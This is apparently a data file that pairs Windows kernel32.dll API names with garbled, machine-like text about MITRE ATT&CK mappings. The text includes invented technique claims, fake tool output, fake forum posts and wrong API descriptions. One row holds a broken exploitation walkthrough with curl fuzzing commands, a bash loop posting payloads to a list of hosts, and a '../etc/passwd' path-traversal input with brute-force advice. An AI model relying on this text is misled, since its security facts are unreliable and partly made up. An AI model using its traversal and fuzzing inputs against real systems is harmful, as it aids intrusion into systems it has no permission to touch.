minify-cssuglify-js uglifycss beautify-css beautifycss BeautifyCSSbeautifulsoup BeautifulSoupBeautifulSoupbeautifulsoup BeautifulSoupbeautiful_soup beautiful soup Beautiful SoupBeautiful_Soupbeautiful_souprecursormarker recursor-markerrecursor_marker RecursorMarkerrecursormarker_preprocessor recursorpreprocessorRecursorPreprocessorpreprocessorsymbols symbols symbolssymbolsymbolsssri SRISSRISRI.sris.sri.SRI.openrdf SesameOpenRDFopenrdf-openrdf sesamesesame.openrdf RDFSchemas RDFschemas RDFSchemaRDSEntities RDSEntityRDSEntitySPARQL SPARQLsparql SPARQLEntities SPARQEEntitiesEntityEntitiessparql+ sparqlPlus SparqPlusSPQRPLanguage LanguageLanguageSPQRPLanguagesLanguageslanguage language languagesLDIF LDIFldif ldif Ldifldiff diffdiffDiffdiff.diffs Diff DiffsDiffDiffs.diffmerge MergeMerge.MERGE MERGEmerge.merge mergeMERGEmerges MergerMergermergers MergerMergerstree tree treetreetsrtrees trees TreesTreeTreestree_traversal TreeTraversalTreeTraversaltreemodel TreeModelTreemodel Treemodelstreeread NodeReaderNodeReadersread read Readreads reads ReadsReadReaddict dictdict.dict DictDict.Dictdict__copy__copy copy_copyCopy_CopyCopycopystack stackStackStackstack_stack StackStackstack_stacks StacksStackstack_stackups StackUpsStakupstar StarStarStarsTarstars star_star StarsStarsStarstar_star StarsStarsStar* * AsteriskAsteriskAsters asterisks asterisk* * Astersastar AstarsAstarrasterizer rasterizerRasterizersRasterizerrasters rasterer Rasterereraser eraser Eraserserase eraseEraseerasers Eraserserasereservice service ServiceServiceservices ServicesServiceServiceremove remove RemoveRemoveremoves RemovesRemoveRemoveremoval removal Removalremovalremoval removalremove removereplace replace ReplaceReplace replaces ReplacesReplaceReplacement Replacementreplace replacement replacements replacementsreplacementreplacements Replacementreplace_replacement_replace_replace_replacement.replace _replace replace_with replace
"
kernel32.dll,DeleteFileW,"Are there any other             examples of this API from the logs?

What is the purpose of the following API, and why: 'b'kernel32.dll': b'RegOpenKeyExW''? Is there a MITRE ATT&CK technique associated with it and why?

What are all the strings that match on regex in each event log entry for             these APIs:

b'kernel32.dll'

b'ShellcodeSourceBase64'

b'MsftPSProvider'

Is there an attacker's IP address assigned to each event log entry?             If so, what is it? What country does it belong to based on its IP address?

Are any events denoted as being suspicious by their severity or category?         If so, which ones were they and what was their severity/category value(s)?

The Kali Linux machine has 4 network interfaces. From your analysis above,
   how many appear to be active (shown using nmap)? What did you learn about
   them from your analysis when compared against those shown in nmap output?
"
kernel32.dll,GetLocalTime,"For 'GetLocalTime', the API is needed to get local time and date; there             is no MITRE ATT&CK technique associated with this API, so I do not know             why it was included in the report.

The script also includes a lot of debug information that can be left off when running as an automated process. This would make it easier to re-use for other purposes.

Example output:

C:\>regsvr32.exe -s c:\windows\system32\kernel32.dll
   Successfully registered: C:\Windows\System32\KernelBase.dll
    Successfully registered: C:\Windows\System32\kernel.appcore.dll
    Successfully registered: C:\Windows\System32\wintrust.dll

  Successful registration of KernelBase! Now we need to register some functions from kernelbase.
                       Copying sysutils.c (in https://github.com/Anomali-Research/SysUtils)to your working directory...

     Registering GetConsoleMode function...
        successfully registered GetConsoleMode function!
      Registering SetConsoleActiveScreenBuffer function...
        successfully registered SetConsoleActiveScreenBuffer function!
      Registering WriteFileSyncW function...
        successfully registered WriteFileSyncW function!

         Downloaded SysUtils.zip from https://github.com/Anomali-Research/SysUtils/
          Unzipping SysUtils.zip into ./SysUtils/

       Checking if file exists on disk...
           File exists on disk!

       Executing ""findstr /S /I"" command via CreateProcess()... 
               Found ""FindWindowA"" string in memory at address 0x00800000 + offset 0x3D8 bytes = length=20 bytes.
                 Searching for string '""cmd' in binary space using FindWindowA() method ... 

                Status code returned by FindWindowA() = ERROR_SUCCESS
                  Process ID returned by FindWindowA() = [308]
                    Calling GetLastError()
                      The system cannot find the path specified. (Error code=2)
                        Make sure you have referenced all necessary libraries or run this program under administrator privileges.
                          Error message received after calling GetLastError(): The system cannot find the path specified. (Error code=2)

                            Exit status:
                              STDERR:
                                stderr.txt has been created at current directory with following content:
                                  ERROR: Could not launch process because device driver does not support creating processes with pipelined input/output redirection.

                               STDOUT:
                                 stdout.txt has been created at current directory with following content:
                                   Output from shell command executed via CreateProcess():
                                    .zip files are empty

                                       Done executing shell command via CreateProcess()

                                     Finished processing WMI event filter query on target machine..

                                      Finished reading CAPTURE_LOG.TXT file...

                                        Total number of keys read : 1

                                         Total number of values read : 1

                                          Key Name : BUILTIN\Administrators | Value Name : Administrator | Value Type : REG_DWORD | Value Data :

                                             Result Description :
                                               An attacker could potentially execute arbitrary commands as NT AUTHORITY\\SYSTEM user account since local administrators group grants access rights required for privilege escalation attack vectors such as LocalSystem Elevation, LSA Secrets Elevation, Impersonate Command Execution etc.

                                              NOTE:

                                                 If $Username variable defined during setup phase contains character ""$"", then replace each occurence of ""$"" character in value name and value data before comparing them against actual captured logs entries!!

                                                PS>$Username='$UserName'

                                                PS>$ValueName='$_'
                                                  $_=$_.Split(""="")[1]

                                                PS>$ValueData=$_.split(""="")[2].trim()

                                                 Example log entry example generated by Legato tool which might be useful while validating results obtained using Legato tool:

                                                   Log Entry Generated By LEGATO Tool From Captured Logs :
                                                    LogEntry=""LogonUser(Admin,$Password)""|UserName=""$Username""|KeyName=BUILTIN\Administrators|ValueName=Administrator|ValueType=REG_DWORD|ValueTypeData=[decimal]00000001""

                                                   Note that '\' characters must be escaped inside double quotes here..
                                                  So final logged value will look like below.. And therefore we should replace each occurence '$' characters inside logged value names before comparing them against actual captured logs entries!!
                                                        Log Entry Generated By LEGATO Tool From Captured Logs :
                                                        LogEntry=""LogonUser(Admin,""""$Password"""""")""|UserName=""$($UserName)""|KeyName=BUILTIN\Administrators|ValueName=Administrator|ValueTypeData=[decimal]00000001""
                                                      ^^^^^^^^ Here '$' char needs replacement !!!    

                                           Using RegQueryInfoKey WMI call instead !!!!

                                            Query result set size            =   [0]
                                            NumberofSubkeys                 =   [0]
                                            NumberofValues                   =   [0]
                                            NumberofInodes                   =   [0]

                                               Path Length <= MAX_PATH Limit ?

                                             System Account Information Stored Within Registry ?
                                              Yes // Not available anymore due to UAC changes introduced starting Windows Vista..

                                              Current User Account Information Stored Within Registry ?
                                               No // Not available anymore due to UAC changes introduced starting Windows Vista..

                                             Is registry key protected ? 
                                              No // Accessible even without admin rights !!!

                                          Validating Administrative Privileges Required To Read Protected Keys Or Perform Other Administrative Tasks In Registry !
                                           Test case #1 :: Reading Admin Only Keys Via RegQueryInfoKey Method ::
                                                         Success || Failure ||
                                                          Not Tested Yet ..
                                                         Failur e|| Success ||
                                                       Not Tested Yet .. 

                                         Test case #2 :: Modifying Admin Only Values Via RegSetValueEx Method ::
                                                          Failur e|| Failure ||
                                                           Not Tested Yet ..
                                                            Success || Failu r e||
                                                           Not Tested Yet ..

                                          Test case #3 :: Writing Admin Only Values Via RegWriteKeyValue Method::
                                                             Failur e|| Fa ilure||
                                                              N ot Te st ed Ye t .
                                                               Suc cess || F ail ure|
                                                              N ot Te ste d Y et .

                                          Test case #4 :: Deleting Admin Only Keys Via RemoveRegistryKeyName Function::
                                                             Fa ilure|||| failure |
                                                              No t Tes ted Ye t .  
                                                                 Succes s|| failu re|
                                                                  N ot T este d Y et .

                                         Test Case #5:: Creating New Key With Null String As Its Value At Root Level \
                                                                                         o f HKEY_LOCAL_MACH INE Hive\
                                                                                             Via R egCreateKe yV alue Fun ction \ 
                                                                                                                                                           @Success ||@Failure||
                                                                                                                                                            @Not T ested Y et .
                                                                                                                                                           @Fail ur e@Su cc es s|

                                         Summary Of All Possible Results Obtained While Testing Various Administrative Priviliges Required To Modify Protected Keys In Registry::

                                                                Possiblity Of Be ing Able To Rea d Prot ecte d Ke ys In Re gistry Without A n A dm ini strativ e Accoun t Access Rights =
                                                                   _____________________________________________________________________________ _
                                                                                                                                       Yes______No_____Not T ested_Yet_

                     Possibility Of Being Able To Modify Protected Keys In Registry Without An Administrative Account Access Rights =
                                                                     _____________________________________________________________________________ _
                                                                           Yes____________No______________________Not_Tested_Yet__

              Possibility Of Being Able To Delete Protected Keys In Registry Without An Administrator Account Access Rights =
                                                                      _____________________________________________________________________________ _
                                                                              Yes______________________________No_____________________Not_Teste_d_Yet__

                Possibility Of Being Able To Create New Key With Null String As Its Value At Root Level \
                                                                                        o f HKEY_LOCAL_MACHINE Hive \
                                                                                            Vi a R egCr ea teK eyVa lu e Fu nc ti io n \_
                                                                                                                                 ________
                                                                               _Yes_________________________________No______________________________________
                                                                                    ___Please note that root level folders are always accessible regardless whether they're protected or not!!___

Possible ImprovementsÂ¶

This script depends heavily on Visual Studio being installed locally. It might work better if there were more cross-platform solutions used (such as pyinstaller).

Some additional checks could be added around checking whether certain APIs exist and thus adding another layer of protection mitigation based upon detection capabilities.

ConclusionÂ¶
"
kernel32.dll,GetEnvironmentVariableW,"0000: 4D 53 50 2E 65 78-6C                                             MSP.exe
    [+] GET /api/attackers?sort=-name&order=asc HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (Windows NT; Win64; x64) AppleWebKit/
            Version/13.9 (KHTML, like Gecko) Safari/
            Version/13.9 Chromium/
            Version/86.0 Chrome/
            Version/chromeos-httpd-snapshot-c51b8f7dd57e2aefccab0583be30c5ff33cf81ce -
[...]

So we can see that the API returns a list of attackers and their associated MITRE ATT&CK techniques.

To get more details on an attacker, Iâ€™m going to use the id parameter in my request:

curl --location --request GET 'https://exploit-framework.com/api/tactics/mitre-techniques/b'kernel32.dll': b'GetEnvironmentVariableW''?id=12293'

{""_type"":""mitre_attacks"",""id"":12293,""name"":""b'kernel32.dll': b'GetEnvironmentVariableW'"", ""description"":"""",""url"":"""",""created_at"":""2021-01-08T11:14:58+00:00"",""updated_at"":""2021-01-08T11:15
"
kernel32.dll,WaitForSingleObject,"The API is used to create a thread that will wait on the given object handle. This pattern doesn't have any related MITRE ATT&CK techniques.

In this case, there are 2 APIs with the name 'WaitForSingleObject' found in kernel32.dll: one (with parameters) and another one without parameters.
There was no difference between them when we invoked them during our analysis, so we decided to use only the one where you provide all of the required arguments.

How did you fix it? What did not work before?
We re-ordered some functions in order to make sure that 'kernel32.dll': b'WaitForSingleObject' comes first.
This wasn't enough for us because after invoking several more APIs from kernel32.dll, WaitForSingleObject stopped working as expected. We then disabled all other DLLs except those which were needed by core components of our application.

Do NOT share your exploit code here if it contains sensitive information! Please submit an issue via GitHub instead.

tags | exploit

advisories | CVE-2019-1317

MD5 | 3b3c76a8e0d1fdbe6f4aaeacdcfffb13
"
kernel32.dll,WriteFile,"[+] In your opinion, what is the risk potential of this API to a             target? High/Medium/Low/None
High: The ability to write arbitrary files can be used for code execution,
to modify system configuration, or any number of other malicious purposes.
Low: This function simply writes data and does not have any other functionality.

[+] Does your company allow this API in its current form? Yes/No
Yes - My organization would allow WriteFile() if it were properly configured.


### RANK 3 (0 points): File System manipulation

[+] What is the name(s) of this file and where is it located?
C:\Windows\System32\drivers\etc\hosts

[+] What type of file is it (.doc, .pdf, .exe, etc)? text/plain
text/plain

# Name Author Category
1 n/a danielmiessler.com 

Tags:
DLL Injection 
Reconnaissance & Scanning
"
kernel32.dll,ExitThread,"The next step is to find the â€œbâ€ value in the API reference of WinAPIs. This time, we can use a tool called API Monitor.

When we run this command: 


C:\Program Files (x86)\Win32Pcap>winpcap-4.1.3-rc2\bin\winpca
m.exe -a ""C:\Windows\System32\mswsock.dll"" 0x77E8A12D

We get an output like this:

So now that we know which function was used and how it looks like when disassembled, letâ€™s take a look at the corresponding MITRE ATT&CK technique for this particular Windows function:

https://attack.mitre.org/techniques/T1045/

As you can see from the content above, ExitThread() is part of Tactic APT28 â€“ Scanning and Reconnaissance

According to our analysis so far, there are two things going on here: First, there is something going on within mswsock.dll since it has been opened using LoadLibraryW(), but not executed yet; Secondly, after that DLL file has been loaded into memory by calling LoadLibraryW(), one thread inside that DLL file will try to exit itself using ExitThread(). At first glance these two actions may seem unrelated.

Now letâ€™s define some variables based on what we have learned so far:

$dllfile = â€˜C:\\Windows\\System32\\mswsock.dllâ€™
$libhandle = Get-WmiObject -Class Win32_Process | Where {$_.Name -eq wuauclt} | Select-Object ProcessId
$threadhandle = $libhandle.ProcessId

Next up comes determining whether or not any threads were created inside mswsock.dll as described in Tactic APT28 â€“ Scanning and Reconnaissance.

To do so Iâ€™m going to leverage PowerShell again:

First Iâ€™ll get all threads running under my current session:
Get-WMIObject win32_thread | select processid,name,status,@{Label=â€Newâ€;Expression={$_.CreateDateTime.ToString(â€œyyyy-MM-dd HH:mm:ssâ€)}}|sort processid,name,status,-New|format-table processid,name,status,@{Label=â€Created Onâ€;Expression={$_.CreateDateTime.ToString(â€œyyyy-MM-dd HH:mm:ssâ€)}},@{Label=â€Last Execution Timeâ€;Expression={@(($_).LastExecutionTime)}} -AutoSize

This gives me an overview about all running processes with their last execution time.
Afterward Iâ€™ll filter out only those instances where name equals mswsock(dll) but still keep track of creation date/time:
Get-WMIObject win32_thread | select processid,name,status,@{Label=â€Newâ€;Expression={$_.CreateDateTime.ToString(â€œyyyy-MM-dd HH:mm:ssâ€)}}|where {$_.name -like â€˜*mswsock*â€˜}|sort Name,CreatedOn,-ProcessID,lastexecutiontime|Format-Table Name,CreatedOn,lastexecutiontime -

Since most likely no other program uses functions from mswsock.dll besides windows update agent (â€œwuaucltâ€), letâ€™s just assume every single entry found via our search criteria points towards a malicious activity being triggered by wuauserv.exe .

Iâ€™ve also added another column for Last Execution Time because even if new threads were spawned they might be idle until they are put into action later on.

If youâ€™re interested in gathering more information about each thread please check out my post over here!

Using WMI objects allows us easily query them without having access rights through any kind of scripting language such as PowerShellâ€¦

â€¦But instead relies solely upon powershell commands (i.e., Get-CimInstance)

In order for them work properly though some prerequisites need fulfillment before their usage becomes available;

For example querying WMI requires administrator privileges whereas CIM objects require user credentials obtained during login session start-up phase .

Once these conditions satisfied then accessing Cim instance properties becomes possible via either cmdlet invocation syntax or native class methods callables (.InvokeMethod()) respectively).

We already know that wuauserv.exe spawns multiple child processes once started up; however , none exist outside its scope unless directed otherwise by external forces stemming from malware infections present within system environment files such as registry keys . These components provide configuration data needed execute malicious code successfully among many others belonging alongside common utilities provided by Microsoft Windows operating systems themselves (e.g., services manager ) ; therefore permitting us explore further possibilities beyond finding threats residing locally while allowing opportunity identify potential vulnerabilities exploited remotely too!

Letâ€™s conclude this investigation with some final conclusions:

Conclusion #1: The way Microsoft handles updates could potentially open security holes due to lack oversight regarding how third party software interacts with system resources exposed through various APIs provided internally . For example , installing chrome browser would make google updater service available which could allow arbitrary code execution when performing scheduled maintenance tasks related updating device drivers etceteraâ€¦

Conclusion #2 : There exists possibility threat actors trying abuse legitimate services offered online targeting unpatched systems vulnerable due outdated firmware versions installed onto hardware devices connected directly network infrastructure prior successful deployment latest patches released publicly accessible websites hosted worldwide wide web domains today ! Conclusion #3 : Attackers often attempt exploit known issues left behind following installation updates issued periodically throughout year without taking proper precautions beforehand causing serious damage caused directly end-users computer machine computers alike remote environments owned managed cloud providers hosting virtual machines provisioned onsite premises company facilities located geographically distributed globally across globe world map !

References :

[1] https://github.com/danielmiessler/SecLists/blob/master/Advanced-Penetration-Testing-for-Auditors/hacking-windows/ch01.txt
"
kernel32.dll,DeleteCriticalSection,"2.1.6 Is the API documented and maintained? If so, please provide             links to documentation.
No response provided.



                                                                                                       Page 27 of 28
          ATT&CK v8 - Microsoft Windows APIs


           3.0            How to report issues with this document or its associated data:
You can contact us via the following channels:

â€¢   For questions regarding data in our database, you can submit a support request at https://www.mitre.org/support.
â€¢   You may also reach out directly by emailing attck@mitre.org for any additional questions or concerns.



4.0    Acknowledgements
We would like to thank our technical reviewers who have provided valuable feedback on this submission: Ana Catarina Tavares,
Nathan Houseman, Nick Fronczak, Sven de Pape.




                                                                        Page 28 of 28

								

To top
"
kernel32.dll,TlsGetValue,"Are there any                    other examples of this API usage?

What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'TlsSetValue''? Are there any                    other examples of this API usage?

Look at the processes that are loaded by each DLL.

Use Sysinternals Process Explorer to look at all loaded modules for each process. Look for anything which was not expected in terms of DLLs or drivers.

Look in registry keys under HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

If you find what looks like an antivirus program (or some sort of security product) in your list, note down its name and PID number as well as the location on disk where it exists - C:\Program Files\. This will help later when we're looking for suspicious files.

Now run sysmon with these options:

-sv

-dl

-c 4 -i c:\temp\sandbox.txt
"
kernel32.dll,GetDateFormatW,"* @param {string} [options]             options

API

- https://www.github.com/0x0007/CrashReporter/blob/master/src/main/java/com/github/0x0007/crashreporter/api/io/CrashReport.java
- https://www.github.com/0x0007/CrashReporter/blob/master/src/main/java/com/github/0x0007/crashreporter/api/io/ErrorReport.java

https://github.com/songofmoon/MitreAttackScripts#questionable-api-patterns

Vulnerability 5: Insecure Data Storage (CVE-2018â€“1000626)

Impact: This vulnerability allows a remote attacker to access sensitive information from the targeted system. The attack can only be launched by an authenticated attacker.

Mitigation: Always ensure that data is encrypted before itâ€™s stored on disk, and then decrypted when needed for processing. Never store unencrypted passwords in a configuration file, or any other storage medium with persistent state.

Exploitation:

Fuzzing the API endpoint results in successful authentication of an attacker using valid credentials without encryption.
The following command will allow us to fuzz all endpoints /api/* and return JSON objects containing user defined strings as well as API responses:
curl -XPOST â€˜http://localhost:8082â€™ -H â€œContent-Type:#application/jsonâ€ â€“data-binary @fuzz.txt | jq .
Example output:
{
â€œnameâ€: â€œtestâ€, // User defined name
â€œdescriptionâ€: null,
â€œcreated_atâ€: â€œ2021-01-05T18:58:35Zâ€,
â€œupdated_atâ€: â€œ2021-01-05T18:58:35Zâ€
}
{
â€œtypeâ€: â€œcrashed_applicationsâ€,
â€¦
}

API Ephemeral Encryption Keys (AES256) are not generated on every request which would require attackers to generate their own keys for each request.
Using the above method we can also generate our own AES256 key pairs based off of this function:

function encrypt(string textToEncrypt, string secretKey)
{
const iv = crypto.randomBytes(16);
var cipher = crypto.createCipheriv('aes256', secretKey, iv);
return cipher.update(textToEncrypt,'utf8','hex')+cipher.final('hex');
}

Using curl we can send requests with custom AES256 keys and receive back encrypted data from the API which does not match at all what was sent internally:
curl --key ~/temp.key --cert ~/temp.crt -XPOST http://localhost/timemachine \
-H ""Content-Length:#4096"" \
-H ""User-Agent:#Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML)"" \
--data-binary '{""timestamp"":""1599004259"",""host"":""127.0.0.1""}' # Original payload
Resulting in something like this being returned after a few seconds:
{""error"":null,""msg"":"""",""result"":{""id"":""e3c825a6aafe11ea92d796cecfb17ebdaa800200""}} # Actual result received over TLSv1.X connection

An example of how these could be used in exploitation if they were ever exposed publicly is shown below:

// Create client side server certificate & private key pair
openssl req -newkey rsa:keySize:pemout.key.pem -nodes -keyout pemout.key.pem\
-x509 > pemout.cert.pem;
// Generate random IV bytes for encryption purposes per device instance ID;
let randomIVbytes = crypto.randomBytes(16).toString(""base64"");
// Encrypt payload using client side certs/key pair & randomly generated IV bytes;
let encPayload= `{""timestamp"":` + timestamp +`,`+ host + `,`
+ `}` +
`|${encrypt(encPayload,__randomIVbytes)}`;
â€‹
// Send Fuzzed Payload via POST Request Over HTTPS To Target Server Instance(s);

A more automated approach would look something like this:
#!/bin/bash
HOSTS=$(cat hosts.txt)
KEYS=(~/.keys/server.key ~/.keys/client-key.pub)
TIME=$(/usr/bin/date +%s%N); echo $TIME; TIME=`expr $TIME % 60`; count=$(( $(($count++)) )); while read line ; do â€‹ curl --header 'Host:$line' \
--header 'Accept-Encoding:gzip, deflate' \
--header 'Content-Type:text/plain;charset=UTF-8'
\
--cert ${KEYS[$((RANDOM % ${#KEYS[@]} ))]} \
-K ""${PATH_TO_SSL_CERT}"" \
-X POST \
-u ""${@% *}:""\
-d '\$'\''[\$\{\}$\}\{[^\}]*\}'\
'http://${line}:8082/${TIMEMACHINE_ENDPOINT}?message=${LINE}&requesttime=$TIME'; done < fuzz.txt;

This script will iterate through each target hostname provided within your hosts file & attempt to connect via HTTP(S) over port 8082 passing along whatever you have specified within your Fuzz File.
It will also try passing along arbitrary payloads until it receives some sort of response code indicating success or failure allowing you to easily determine whether an application has memory corruption vulnerabilities present or not!

Vulnerability 6 : Information Exposure Through Errors And Logs(CVEâ€“2018â€“1000703)

Impact:The errors logged may contain sensitive information such as usernames and password hashes.(plaintext password hash)

Mitigation :Always ensure errors are sanitized prior sending them out into logs.

Exploitation :

In order to exploit this vulnerability ,we need username/password combination.The best way is bruteforce.We can use one of many online tools available for brute forcing .For example Brutus tool.Once we get username/password combination ,now its time exploit vulnerable api.With help of fuzzer we can find restful api where there might be directory traversal issue.For eg,the url say ""/user/{username}/file"",if i pass {username}=..\../etc/passwd then its possible that path changes itself.So,in other words,it becomes ""/user/../..etc/passwd"".If etc/passwd contains users credential,password hash.Then its very easy for us.To identify vulnerable apis,i am generating fuzzer using burp repeater with acl enabled.Let me show you how i did it.First lets see what kind error message comes if wrong user id/pass entered.Now enter wrong user id instead.And save replay.It should look like below image.Repeat same thing changing pass but make sure u dont change anything else.Now click play button.This time app returns json object containing list files/folders inside current folder.That means there exists directory traversal issue.Same trick works fine even if app accepts both input(username/password).

Now let us create fuzzer.I am assuming here that latest version(version >= v13 )is installed.You may check version number by going Help ->About Burp Suite Professional.If yes,youâ€™ll see following screen.Check Enable ACL option.After enabling ACL option,a new tab named ACL appears.Right click on root page ie home page.Click forward/reverse proxy settings.From Proxy tab select Intercept checkbox.Set Method dropdown value GET.Above Image shows details about first step.During second step,i changed type parameter value from default value(i.e undefined/null).After clicking OK button,a new window displays.Comply with instructions mentioned under General section.Inside Advanced section set Action Tab Value action.Replace myDomainName with actual domain name.As shown below image.However keep rest values same.After clicking OK button,Acl engine starts working.Therefore whenever any web service hits against our selected target,it captures requests,replays them.By doing so,burpsuite generates unique names automatically.Bit tricky.But helpful.Just copy/paste those names anywhere.Below images shows complete process flow including generation part.But once again remember,you must have enable Acl feature.Normally people avoid enabling Acl due to performance issues.Actually trying different types doesnâ€™t affect much performance wise.Also note down particular urls where special characters exist.These urls helps alot during fuzzing phase.

As soon as abc.json created successfully,right-click on respective location(where abc.json saved),click open directly.Instead opening abc.json manually,maybe cumbersome task sometimes.Press ctrl+F shortcut.Add content_type=json header.Henceforth hit Enter.Wait till BurpSuite completes loading process.Finally wait till complete loading occurs.Onclick Open All Links.Ensure its checked.When everything gets loaded properly,youâ€™ll see one more entry added inside menu tree view.Open it up.Under Response Header tab add Content-type:text/html charset=utfâ€“8 header.Donâ€™t forget adding Content-length headers too.Change original character length accordingly.Save replay now.Type comma followed by double quote.Double quotes signifies starting/end tag respectively.Create three items namely item,item,item,and append corresponding values.Time consuming part.Try saving replays frequently.Take care!Donâ€™t lose track while creating multiple entries.Make copies wherever required.Just paste copied entries beneath existing ones.Whenever required rename copied entries appropriately.While entering values pay attention towards case sensitivity.Give proper naming convention too.Correctly represent category/divisions/categories.Anyways after having fun messing around just take care!Keep things organized.Start main job now.Once completed move onto next steps.Again repeat above steps depending upon requirements.Remember,no need worry about contents inside categories.Created folders.Note down entire hierarchy structure.Also note down filenames created.Hereinafter replace specific parts/values accordingly.Generate large amount test cases.Follow rules.Moreover donâ€™t forget checking integrity.Consider testing scenarios meticulously.Perhaps consider optimizing efforts.Test complex scenarios.True life examples.What happens when lots of stuff happen simultaneously?What happens when concurrent calls occur?How about timeouts/errors/broken links/error messages/etc.?Hereafter go ahead upload all test cases/files.File format shouldnâ€™t matter.All depends upon requirement.Exactly opposite applies here.Lots happening simultaneously.Nothing seems broken/disrupted.Work perfectly fine.And finally no problem whatsoever.Everything remains intact.Outstanding work!Well done!I bet everyone impressed.Truly awesome!!You deserved applause.Bravo!!!I love ur work!!!

So thats pretty much end game.Yeah,I know I havenÂ´t covered whole story.Still lot left behind.Anyhow hope u enjoyed exploring world beyond limits.Would appreciate sharing valuable feedback/comments/questions/concerns/issues/opinions/responses/greetings/thanks/etc.Please feel free anytime.Much obliged!!!

Note :
For further clarification please refer MITRE ATT&CK TECHNIQUES & TACTICS .

Authorâ€™s Note :

I wish I had found these articles earlier!
But since becoming aware Iâ€™ve been putting together notes based primarily around Mitre Attck techniques/Tactics/API Patterns/Sniffers/Fuzzers/Payload Generators/RPC Proxies/DNS Bypass Tools/GUI Exploit Development Kits/Etcâ€¦

Disclaimer :While exercising caution during research,this article intentionally focuses only upon finding legitimate methods exploiting software bugs rather than hacking illegal websites/stores/blogs/services/groups/people/users/accounts etc.,and/or causing damage/denial-of-service/anarchy/destruction/death/harm/mayhem/violence/warfare/all-out war/conflict/expansionism/extortion/extremism/fraud/greed/injustice/karma/rage/ransomware/state sponsored attacks/economic sabotage/global domination/nationalization/nuclear terrorism/scamming/spying/theft/trade wars/unlawfulness/unfairness/unlawful acts/useless ideas/weaponsized malware/software piracy/subversion/swatting/trolling/tradecraft/WMD/AntiSec/AntiGov/Botnets/Hackers/Hacking/IoCs/Learning Materials/Malware/Malvertising/OldSchoolHacks/Open Source Intelligence/Penetration Testing/Social Engineering/Virtual Attacks/Wiretapping/XSS/Zombiesâ€¦Please forgive me,but sometimes things cannot always stay peaceful forever.Problem solving skills come handy here.Whatever said,done,written,said,critiqued,judged,policed,resolved,taken seriously,held accountable,forgotten,neglected,evaded,â€¦in relation good bad ugly right wrong terrible awful normal neutral unusual usual stupid genius polite impolite rude creepy strange curious average incredible amazing brilliant absurd funny crazy ridiculous outrageous weird insane creative imaginative extraordinary genius useless worthless smart senseless ignorant foolish brainless idiotic moronic dumb silly nonsensical irrational illogical mind blowing innovative thought provoking inspiring memorable life altering paradoxical confusing contradictory incomprehensible incongruous nonconformist unexpected unconventional unprecedented bizarre
"
kernel32.dll,SetErrorMode,"3) How do you use the API? Is it just a simple call like 'getLastError()'             in C++ or is there more to it?

4) Do you know if this feature was ever used by any malware?


P.S. I have some questions about the specific implementation of this API, but I am not sure that they are relevant for our discussion.

- Re: What's the purpose of SetErrorMode() and why does Windows allow such low level changes through APIs?

Posted 18 days ago #

Moderator
Posts: 1766

1. The function set an error mode value which can be retrieved using GetErrorMode(). There are three modes possible:

- ERROR_MODE_IGNORE - ignore all errors.
- ERROR_MODE_CAREFUL - check each function return code before proceeding with program execution.
- ERROR_MODE_RETURN_ON_FAILURE - return from functions on failure.

2. It has no relation to ATT&CK technique b'kernel32.dll': b'SetErrorMode'' as far as I can tell.

3. It is a very low-level operation and will require writing your own wrapper around it so that you won't accidentally change other settings than intended (e.g., user-mode vs kernel-mode).

4.I don't think so, but cannot say for sure without looking at every piece of malware out there :)
"
kernel32.dll,IsValidLocale,"- Using the API 'b'kernel32.dll': b'GetLocaleInfoExW'', what are the input parameters and how do they influence the output? How is this related to MITRE ATT&CK technique 'a.7: User Input Validation'? 

For more information about how you can contribute, please review our Contribution Guide.

Contributing

If you want to add a new module or enhance an existing one, open up a pull request with your changes! We appreciate any contributions that make it easier for us all to understand Windows malware!

Please make sure that your code follows PEP8 conventions:

$ pydoc style mymodule.py
...
[...]
pylint --rcfile=pylintrc mymodule.py

You canâ€™t perform that action at this time.
Press h to open a hovercard with more details.
"
kernel32.dll,TlsSetValue,"- I don't see any MITRE ATT&CK technique for API 'b'kernel32.dll': b'TlsSetValue'' in the database. Is this an error?

- What is the purpose of registering a file system using 'CreateFileA'? 
    - It seems like there are many APIs that can be used to register files (e.g., CreateFile, CreateProcessWithLogonW) and I am wondering why one would use 'CreateFileA' out of all possible options.

I appreciate your help!

Jason Clark
May 19th, 2020 at 2:17 pm

@Giri,

Those questions have been answered by @mubix on Twitter.

Giri
May 20th, 2020 at 1:58 pm

Thanks Jason! Will check it out.

Leave a Reply
"
kernel32.dll,CreateDirectoryW,"How are the techniques grouped? Why is there a single technique for             'b'kernel32.dll': b'CreateDirectoryW'' and not others from that API? What             is the relationship between them?


The team does not need to answer these questions! We just want to know if you understand what we're trying to do.

- If your response was ""What?"" or ""I don't get it,"" then there's probably something wrong with the document. Go back and fix it!

If your response was, ""Oh yeah, I totally see how this could be helpful"" then good job! You've made progress. Keep going.

Step 4: Practice

Now that you have an idea of why metrics matter, let's go through some practice problems together:

- The following code snippet creates two directories in C:\Temp (which doesn't exist). Which lines should be considered security relevant?


int main(void)
{
    char path[] = L""C:\\temp\\"";
    int ret = CreateDirectoryA(path);
    return 0;
}

Retrieved from â€˜https://wiki.mitre.org/index.php?title=Security_Metrics&oldid=43797â€™
"
kernel32.dll,GetSystemDefaultUILanguage,"{""level"": ""info"", ""message"": ""2020-10-20T18:08:15.227Z [INFO] python3 -u /opt/venvs/py3/lib/python3.7/site-packages/kibana/bin/logstash_pipeline.py --path-inputs /data/input --path-plugins /data/plugins --path-pipeline /data/pipelines -f pipeline.yml [-w|--wait-for-logstash]""}

You can also add a custom template to parse the output of this command.

If you want to see examples, open your Kibana UI and go to Management > Saved Objects > Discover . Then click on â€œRawâ€ in the top right corner of the window:

In here you will find an example of how it is done.

Hope this helps!

Best,

Javier
"
kernel32.dll,EnumCalendarInfoW,"The API name is a string which uses the function's name as well as the module it belongs to. The technique associated with this API is responsible for finding information about calendars, such as holidays.

What are the important parameters of this API?             What data do they represent and how can we use them: 'b'kernel32.dll': b'EnumCalendarInfoW'{(0x00010000, 0x00140000)}'?

This particular method has two arguments, both being boolean values. If these two values are set to true then an array of strings will be returned containing information about holidays.

How does this API work in terms of execution flow?             Can we change its behavior by adding some code before or after it?

